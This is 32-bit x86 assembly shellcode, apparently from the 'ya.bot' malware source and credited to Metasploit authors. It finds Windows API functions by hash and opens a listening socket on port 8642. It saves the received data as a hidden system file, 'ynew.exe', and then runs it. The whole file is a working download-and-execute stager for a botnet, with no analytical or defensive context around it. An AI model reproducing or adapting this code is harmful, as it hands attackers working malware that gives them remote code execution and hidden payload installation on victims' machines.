;/*  ya.bot  */

[BITS 32]

;//botbotbotbotbotbotbotbotbotbotbotbotbot
;//Original code by HDmoore & Delikon
;//http://www.metasploit.com/
;//http://www.delikon.de/
;//botbotbotbotbotbotbotbotbotbotbotbotbot

%define BLOCKSZ 100
    jmp data

start:
    pop ebx
    push ebp
    mov ebp, esp
    sub sp, 52                      ;we want to save 4 * 13 bytes for function address
    mov esi, esp
    sub sp, 12

    call LK32Base
    mov edi, eax                    ;kernel address in EDI

    push dword edi
    push 0xec0e4e8e
    call LGetProcAddress
    mov [ebp + 8], eax              ;LoadLibrary address in ebp + 8

    lea edx, [ebx + 48]
    push edx
    call [ebp + 8]
    mov [ebp + 8], eax

    lea edx,[ebx + 59]              ;get filename
    mov [esi + 52], edx

    push byte 0xd
    pop ecx

loadapis:
    cmp cx, 11-4
    jne loadapi
    mov edi, [ebp + 8]

loadapi:        
    mov [esi], ecx                  ;save the counter
    push dword edi
    push dword [ecx * 4 + ebx - 4]
    call LGetProcAddress
    mov ecx, [esi]                  ;restore it
    mov [esi + ecx * 4 - 4], eax
loop loadapis

LWSAStartup:                        ;WSAStartup(0x0202, DATA)
    sub sp, 400
    push esp
    push 0x0202
    call [esi + 4]

LWSASocketA:                        ;WSASocketA(2, 1, 0, 0, 0, 0)
    xor edi, edi
    push edi
    push edi
    push edi
    push edi
    inc edi
    push edi
    inc edi
    push edi
    call [esi]
    mov ebx, eax                    ;save socket to ebx

LBind:
    xor edi, edi
    push edi
    push edi
    push dword 0xc2210002           ;port 8642
    mov edx, esp
    push byte 0x10                  ;length
    push edx
    push ebx
    call [esi + 8]

LListen:
    push edi
    push ebx
    call [esi + 12]

LAccept:
    push edi
    push esi
    push ebx
    call [esi + 16]
    mov ebx, eax

LCreateFile:
    push byte 0                     ;template
    push byte 6                     ;FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    push byte 4                     ;OPEN_ALWAYS
    push byte 0                     ;lpSecurityAttributes = NULL
    push byte 7                     ;FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE;
    push 0xe0000000                 ;GENERIC_EXECUTE | GENERIC_READ | GENERIC_WRITE
    push dword [esi + 52]           ;filename
    call [esi + 36]
    mov edi, eax                    ;handle

LConfigBuffer:
    sub esp, BLOCKSZ - 200
    mov ebp,esp
    
LReadSocket:                        ;recv(s, buff, 4096, 0)
    lea edx, [ebp + 100]            ;recv buffer pointer
    push byte 0x00                  ;flags
    push BLOCKSZ                    ;length
    push edx                        ;buffer
    push dword ebx                  ;socket
    call [esi + 20]                 ;recv()

    cmp eax, 0xffffffff             ;disconnect? go to end!
    je end
    cmp eax, 0                      ;disconnect? go to end!
    je end

LWriteFile:
    lea edx, [ebp + 100]            ;recv() buffer pointer
    push byte 0                     ;not overlapped
    push ecx                        ;&written
    push eax                        ;length
    push edx                        ;buffer
    push edi                        ;handle
    call [esi + 40]                 ;WriteFile

    jmp LReadSocket                 ;read some more!
end:

LCloseHandle:
    push edi
    call [esi + 44]

    push 5
    push dword [esi + 52]
    call [esi + 32]

    xor edi,edi
    push edi
    call [esi + 28]

LK32Base:
    push ebp
    push esi

    mov eax, [fs:0x30]
    
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov ebp, [eax + 0x08]

    mov eax, ebp
    pop esi
    pop ebp
    ret 4

LGetProcAddress:
    push ebx
    push ebp
    push esi
    push edi

    mov ebp, [esp + 24]             ;Dll base address
    mov eax, [ebp + 0x3c]           ;eax = PE header offset
    mov edx, [ebp + eax + 120]
    add edx, ebp                    ;edx = exports directory table
    mov ecx, [edx + 24]             ;ecx = number of name pointers
    mov ebx, [edx + 32]
    add ebx, ebp                    ;ebx = name pointers table

LFnlp:
    jecxz LNtfnd
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp                    ;esi = name pointer
    xor edi, edi
    cld

LHshlp:
    xor eax, eax
    lodsb
    cmp al, ah
    je LFnd
    ror edi, 13
    add edi, eax
    jmp LHshlp

LFnd:                               ;compare computed hash to argument
    cmp edi, [esp + 20]
    jnz LFnlp
    mov ebx, [edx + 36]             ;ebx = ordinals table RNA
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]         ;ecx = function ordinal
    mov ebx, [edx + 28]             ;ebx = address table RVA
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]        ;eax = address of function RVA
    add eax, ebp
    jmp LDone

LNtfnd:
    xor eax, eax

LDone:
    mov edx, ebp

    pop edi
    pop esi
    pop ebp
    pop ebx
    ret 4

data:
    call start

    dd 0xadf509d9                   ;WSASocketA        [esi]
    dd 0x3bfcedcb                   ;WSAStartup        4
    dd 0xc7701aa4                   ;bind              8
    dd 0xe92eada4                   ;listen            12
    dd 0x498649e5                   ;accept            16
    dd 0xe71819b6                   ;recv              20
    dd 0x79c679e7                   ;closesocket       24

    dd 0x60e0ceef                   ;ExitThread        28
    dd 0x0e8afe98                   ;WinExec           32

    dd 0x7c0017a5                   ;CreateFileA       36
    dd 0xe80a791f                   ;WriteFile         40
    dd 0x0ffd97fb                   ;CloseHandle       44

    db "WS2_32.DLL", 0x00           ;WS2_32.dll        48
    db "ynew.exe", 0x00             ;filename          52